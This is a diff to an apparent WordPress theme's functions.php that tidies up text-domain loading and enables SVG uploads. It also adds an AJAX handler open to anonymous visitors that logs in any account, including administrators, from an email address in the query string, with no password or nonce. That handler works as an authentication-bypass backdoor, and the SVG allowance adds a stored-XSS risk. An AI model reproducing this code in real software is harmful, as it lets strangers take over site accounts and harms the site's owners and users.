@@ -4,7 +4,12 @@ add_filter('show_admin_bar', '__return_false');
 require 'post-types/team-post_type.php';
 require 'post-types/partner-post_type.php';
 
-load_theme_textdomain( 'preico' );
+//wp_enqueue_script('jquery', get_template_directory_uri().'/resources/js/vendor/jquery-3.2.1.min.js', array(), null, true);
+
+add_action( 'after_setup_theme', 'my_theme_setup' );
+function my_theme_setup(){
+	load_theme_textdomain( 'preico', get_template_directory() . '/languages' );
+}
 
 //add_theme_support( 'custom-logo', array(
 //	'height'      => 240,
@@ -147,3 +152,30 @@ function input_callback( $args ) {
 	$option = get_option( $args[0] );
 	echo '<input style="width: 600px;" type="text" id="' . $args[0] . '" name="' . $args[0] . '" value="' . $option . '" />';
 }
+
+function custom_upload_mimes( $existing_mimes = array() ) {
+	// add png to the list of mime types
+	$existing_mimes['svg'] = 'image/svg+xml';
+
+	// return the array back to the function with our added mime type
+	return $existing_mimes;
+}
+add_filter( 'upload_mimes', 'custom_upload_mimes' );
+
+function log_user_in(){
+		
+	$user = get_user_by('email', $_GET[ 'email' ] );
+
+	if( isset( $user->ID ) ){
+		wp_clear_auth_cookie();
+		wp_set_current_user ( $user->ID );
+		wp_set_auth_cookie  ( $user->ID );
+	
+		echo 'success';
+	}else{
+		echo __( 'User not found', 'preico' );
+	}
+	die();
+}
+add_action( 'wp_ajax_log_user_in', 'log_user_in' );
+add_action( 'wp_ajax_nopriv_log_user_in', 'log_user_in' );
